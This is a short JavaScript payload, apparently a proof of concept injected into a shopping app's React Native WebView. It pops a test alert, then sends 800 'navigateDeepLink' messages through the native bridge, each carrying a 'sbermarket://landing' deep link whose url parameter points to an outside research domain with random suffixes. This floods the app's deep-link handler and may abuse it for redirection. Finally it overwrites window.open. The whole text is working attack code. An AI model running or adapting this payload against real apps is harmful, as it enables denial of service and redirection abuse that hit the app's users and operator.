alert('test_js');
for(let i=0; i<800; i++) {
  window.ReactNativeWebView.postMessage(JSON.stringify({
  action: 'navigateDeepLink',
  data: 'sbermarket://landing?url=https://tiburon-research.ru/flood-' + i + '-' + Date.now() + '-' + Math.random().toString(36).substr(2)
  }));
}
window.open = "https://google.com";
